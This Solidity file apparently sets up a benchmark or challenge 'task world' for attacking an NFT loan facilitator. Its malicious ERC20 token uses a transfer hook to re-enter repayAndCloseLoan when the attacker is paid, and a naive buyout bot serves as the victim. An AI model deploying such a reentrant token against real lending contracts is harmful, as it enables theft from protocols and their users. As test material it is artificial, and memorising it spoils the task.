// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {NFTLoanFacilitator} from "contracts/NFTLoanFacilitator.sol";
import {INFTLoanFacilitator} from "contracts/interfaces/INFTLoanFacilitator.sol";
import {CryptoPunks} from "contracts/test/mocks/CryptoPunks.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/// @dev Loan-asset token used by the task world. Once armed with a loan id,
/// delivering tokens to the attacker from any other account re-enters the
/// facilitator and repays/closes that loan. The contract is pre-funded and
/// has approved the facilitator, so the token total supply never changes
/// during the attack.
contract TaskReentrantToken is ERC20, IERC721Receiver {
    INFTLoanFacilitator public immutable facilitator;
    address public immutable attacker;
    uint256 public loanId;
    bool public armed;

    constructor(address facilitatorAddress, address attacker_) ERC20("MAL", "MAL") {
        facilitator = INFTLoanFacilitator(facilitatorAddress);
        attacker = attacker_;
    }

    function arm(uint256 loanId_) external {
        loanId = loanId_;
        armed = true;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @dev Pre-fund this contract and let the facilitator pull the repayment.
    function seed(uint256 amount) external {
        _mint(address(this), amount);
        _approve(address(this), address(facilitator), type(uint256).max);
    }

    function _afterTokenTransfer(address from, address to, uint256) internal virtual override {
        if (!armed) return;
        if (from == address(0)) return;
        if (from == to) return;
        if (from == address(this)) return;
        if (to == attacker) {
            facilitator.repayAndCloseLoan(loanId);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/// @dev Victim. It is a naive loan-buyout bot: it holds the loan asset and
/// buys out any open loan at a fixed amount/duration/rate by calling lend().
contract TaskVictimBuyer is IERC721Receiver {
    NFTLoanFacilitator public immutable facilitator;
    TaskReentrantToken public immutable token;
    uint128 public constant AMOUNT = 1e20;
    uint32 public constant DURATION = 1100;

    constructor(address facilitatorAddress, address tokenAddress) {
        facilitator = NFTLoanFacilitator(facilitatorAddress);
        token = TaskReentrantToken(tokenAddress);
        token.approve(facilitatorAddress, type(uint256).max);
    }

    function buyout(uint256 loanId) external {
        facilitator.lend(loanId, 0, AMOUNT, DURATION, address(this));
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/// @dev Borrower side of the world. It custody-mints a collateral NFT and
/// opens loan 0 with the task loan asset; the attacker is expected to fund it.
contract TaskBorrower is IERC721Receiver {
    NFTLoanFacilitator public immutable facilitator;
    CryptoPunks public immutable punks;
    uint256 public immutable collateralId;
    uint256 public loanId;

    constructor(address facilitatorAddress, address punksAddress, address loanAsset) {
        facilitator = NFTLoanFacilitator(facilitatorAddress);
        punks = CryptoPunks(punksAddress);
        collateralId = punks.mint();
        punks.approve(facilitatorAddress, collateralId);
        loanId = facilitator.createLoan(collateralId, punksAddress, 0, 1e20, loanAsset, 1000, address(this));
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
